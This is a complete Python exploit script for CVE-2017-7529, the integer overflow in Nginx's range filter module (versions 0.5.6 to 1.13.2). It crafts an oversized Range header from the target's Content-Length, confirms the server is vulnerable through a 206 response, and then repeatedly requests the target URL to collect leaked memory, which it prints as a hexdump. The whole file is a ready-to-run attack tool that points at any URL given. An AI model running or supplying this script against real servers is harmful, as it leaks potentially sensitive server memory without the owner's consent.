#  Nginx versions since 0.5.6 up to and including 1.13.2 are vulnerable
# to integer overflow vulnerability in nginx range filter module resulting into leak
# of potentially sensitive information triggered by specially crafted request.
# * CVE-2017-7529
# - By @BlackViruScript / @Black#4544
import urllib.parse, requests, argparse

from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


global colorama, termcolor
try:
    import colorama, termcolor
    colorama.init(autoreset=True)
except Exception as e:
    termcolor = colorama = None

colored = lambda text, color="", dark=False: termcolor.colored(text, color or "white", attrs=["dark"] if dark else []) if termcolor and colorama else text

class Exploit(requests.Session):
    buffer = set()
    def __init__(self, url):
        length = int(requests.get(url, verify=False).headers.get("Content-Length", 0)) + 623
        super().__init__()
        self.headers = {"Range": f"bytes=-{length},-9223372036854{776000 - length}"}
        self.target = urllib.parse.urlsplit(url)

    
    def check(self):
        try:
            response = self.get(self.target.geturl(), verify=False)
            return response.status_code == 206 and "Content-Range" in response.headers
        except Exception as e:
            print(e)
            return False
    
    def hexdump(self, data):
        for b in range(0, len(data), 16):
            line = [char for char in data[b: b + 16]]
            print(colored(" -  {:04x}: {:48} {}".format(b, " ".join(f"{char:02x}" for char in line), "".join((chr(char) if 32 <= char <= 126 else ".") for char in line)), dark=True))
    
    def execute(self):
        vulnerable = self.check()
        print(colored(f"[{'+' if vulnerable else '-'}] {exploit.target.netloc} is Vulnerable: {str(vulnerable).upper()}", "white" if vulnerable else "yellow"))
        if vulnerable:
            data = b""
            while len(self.buffer) < 0x80:
                try:
                    response = self.get(self.target.geturl(), verify=False)
                    for line in response.content.split(b"\r\n"):
                        if line not in self.buffer:
                            data += line
                            self.buffer.add(line)
                except Exception as e:
                    print()
                    print(colored(f"[!] {type(e).__name__}:", "red"))
                    print(colored(f" -  {e}", "red", True))
                    break
                except KeyboardInterrupt:
                    print()
                    print(colored("[!] Keyboard Interrupted! (Ctrl+C Pressed)", "red"))
                    break
                print(colored(f"[i] Receiving Data [{len(data)} bytes] ..."), end = "\r")
            if data:
                print()
                self.hexdump(data)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(prog = "CVE-2017-7529",
                                     description = "Nginx versions since 0.5.6 up to and including 1.13.2 are vulnerable to integer overflow vulnerability in nginx range filter module resulting into leak of potentially sensitive information triggered by specially crafted request.",
                                     epilog = "By: @BlackViruScript / @Black#4544")
    parser.add_argument("url", type = str, help = "Target URL.")
    parser.add_argument("-c", "--check", action = "store_true", help = "Only check if Target is vulnerable.")
    args = parser.parse_args()
    try:
        exploit = Exploit(args.url)
        if args.check:
            vulnerable = exploit.check()
            print(colored(f"[{'+' if vulnerable else '-'}] {exploit.target.netloc} is Vulnerable: {str(vulnerable).upper()}", "white" if vulnerable else "yellow"))
        else:
            try:
                exploit.execute()
            except Exception as e:
                print(colored(f"[!] {type(e).__name__}:", "red"))
                print(colored(f" -  {e}", "red", True))
    except KeyboardInterrupt:
        print(colored("[!] Keyboard Interrupted! (Ctrl+C Pressed)", "red"))
    except Exception as e:
        print(colored(f"[!] {urllib.parse.urlsplit(args.url).netloc}: {type(e).__name__}", "red"))
